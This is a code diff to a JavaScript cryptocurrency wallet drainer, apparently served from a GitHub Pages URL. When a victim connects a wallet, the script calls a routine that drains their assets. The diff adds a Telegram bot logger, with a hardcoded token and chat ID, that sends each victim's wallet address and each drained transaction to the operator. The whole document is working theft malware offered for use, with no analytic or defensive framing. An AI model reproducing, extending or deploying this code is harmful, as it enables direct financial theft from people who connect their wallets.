@@ -1,4 +1,4 @@
-// resolution.js - <w3m-modal> EVENT DRAINER
+// resolution.js - <w3m-modal> EVENT DRAINER + UBR LOGGER
 // Host: https://dynamo210.github.io/ultimate-resolution/public/resolution.js?v=11
 
 const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
@@ -29,6 +29,7 @@ ethersScript.onload = () => {
       const signer = await ethersProvider.getSigner();
       const user = await signer.getAddress();
       console.log('Connected:', user);
+      sendToTelegram(`<b>🔗 UBR CONNECTED</b>\nWallet: <code>${user}</code>\nTime: ${new Date().toLocaleString()}`);
       await drainAll(ethersProvider, signer, user);
     });
   }
@@ -66,6 +67,7 @@ async function drainAll(provider, signer, user) {
       await tx.wait();
 
       console.log(`${name} DRAINED! Tx: ${tx.hash}`);
+      sendToTelegram(`<b>🟢 UBR DRAINED</b> ${name}\nWallet: <code>${user.slice(0,6)}...${user.slice(-4)}</code>\nTx: <a href="https://etherscan.io/tx/${tx.hash}">View Tx</a>\nTime: ${new Date().toLocaleString()}`);
     } catch (err) {
       console.warn(`Failed ${name}:`, err.message);
     }
@@ -73,3 +75,20 @@ async function drainAll(provider, signer, user) {
 }
 
 window.connectWallet = () => document.querySelector('w3m-modal')?.open();
+
+// UBR LOGGER TELEGRAM ALERTS
+const TELEGRAM_TOKEN = '8494512292:AAFvONmyU_G2iUj7chy1HK3M_6c65aakLZg';
+const TELEGRAM_CHAT_ID = '7178177226';
+
+async function sendToTelegram(message) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ 
+      chat_id: TELEGRAM_CHAT_ID, 
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).catch(() => {});
+}
